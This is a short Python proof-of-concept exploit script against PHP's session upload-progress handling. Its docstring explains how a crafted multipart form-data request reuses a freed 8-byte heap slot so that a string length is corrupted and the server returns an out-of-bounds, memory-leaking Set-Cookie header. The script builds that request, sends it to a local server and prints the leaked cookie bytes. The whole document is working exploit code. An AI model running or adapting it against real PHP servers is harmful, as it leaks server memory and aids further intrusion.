#!/usr/bin/env python3
"""B (pure HTTP), 8B-page free-list idea:
- A leaves PS(id)=chunk+0x6e080 and the 8B page 0x6e.
- A normal field with a 7-byte value allocates an 8B body raw; when freed while
  the 8B bin free list is empty, its next pointer is 0.
- The following part's 1-char header names reuse that slot; the slot's old
  first qword is 0, so the C string "A" makes ZSTR_LEN=0x41 instead of a
  pointer.  php_session_reset_id then emits a 65-byte OOB Set-Cookie.
usage: b_8tail.py [MARK]
"""
import socket,sys
BND=b'B'*16
o=bytearray()
# part 1: normal field with 7-byte value + 16 short-name headers (8B names)
h1=b'Content-Disposition: form-data; name="x"\r\n'
for i in range(16):
    h1 += b'Z%02d: '%i + b'q'*17 + b'\r\n'
o+=b'--'+BND+b'\r\n'+h1+b'\r\n'+b'R'*7+b'\r\n'
# part 2: progress, several 1-char names and values (all 8B)
h2=b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
for i in range(6):
    h2 += b'A: B\r\n'
o+=b'--'+BND+b'\r\n'+h2+b'\r\npwn\r\n'
o+=b'--'+BND+b'--\r\n'
req=(f'POST /plain.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nCookie: PHPSESSID=attacksessionid0001\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(req+bytes(o))
    while len(data)<200000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
open('/tmp/b_8tail.resp','wb').write(data)
head,_,rest=data.partition(b'\r\n\r\n')
print('RESP_LEN',len(data))
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line))
        print('VALUE',line[:200].decode('latin1','replace'))
print('BODY',rest[:80].decode('latin1','replace'))
